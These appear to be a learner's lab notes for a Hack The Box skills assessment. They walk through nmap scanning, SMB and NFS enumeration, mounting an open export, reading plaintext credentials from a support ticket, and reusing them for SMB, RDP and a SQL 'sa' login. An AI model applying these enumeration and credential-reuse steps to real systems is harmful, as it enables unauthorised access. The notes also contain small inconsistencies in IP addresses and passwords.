[[SMB]]
[[NFS]]


This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.
#### NMAP 
```bash
sudo nmap -sVC --min-rate 5000 -oA medium.scan 10.129.66.223
```
output:
```
 sudo nmap -sCV --min-rate 5000 -oA medium.scan 10.129.66.223
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 00:24 +0200
Nmap scan report for 10.129.66.223
Host is up (0.30s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
```

- SMB (139,445)
- NFS (111,2049)

SMB enumeration 
- all smb probing failed 
```bash
smbclient -L //10.129.66.223 -U "guest%"
```
- reusing creds from last lab failed too 
```bash
smbclient -L //10.129.66.223 -U "ceil%qwer1234"
```
- enum4linux 
```bash
enum4linux-ng -A 10.129.66.223
```
output:
```
❯ enum4linux-ng -A 10.129.66.223
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.66.223
[*] Username ......... ''
[*] Random Username .. 'pydhbibi'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ======================================
|    Listener Scan on 10.129.66.223    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.66.223    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.66.223    |
 ==========================================
```

so nothing.....

NFS enumeration
- List all the exports
```bash 
showmount -e 10.129.66.223  
```
> Export list for 10.129.66.223:
/TechSupport (everyone)

create a mount mount and mount [[NFS#^c2315e]]
```bash 
create mountdir

sudo mount -t nfs -o nolock 10.129.66.223:/TechSupport ./mountdir/
```
list the contents with sudo 
```bash
sudo ls -la ./mountdir
```
> -rwx------ 1 4294967294 4294967294  1305 Nov 10  2021 ticket4238791283782.txt

it had 1305 bytes
view its contents
```bash
sudo cat mountdir/ticket4238791283782.txt
```
output:
```
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
```
creds => `alex:lol123!mD`

list SMBB shares
```bash
smbclient -L //10.129.66.255 -U 'alex%lol123!md'
```

probe devshare
```bash
smbclient //10.129.66.255/devshare -U 'alex%lol123!mD'
```
downloading important.txt
we find
`sa:87N1ns@slls83`
After some research, i find out that:
**The `sa` credential itself:** SQL Server's `sa` (system administrator) login is the built-in top-level DB account, similar to `root` in a Unix DB context

so i attempted windows remote login via xfreerdp
```bash
xfreerdp3 /v:10.129.66.255 /u:alex /p:'lol123!mD'
```

run the studio as admin  and use that pass
find the accounts database, left click and run the script as query
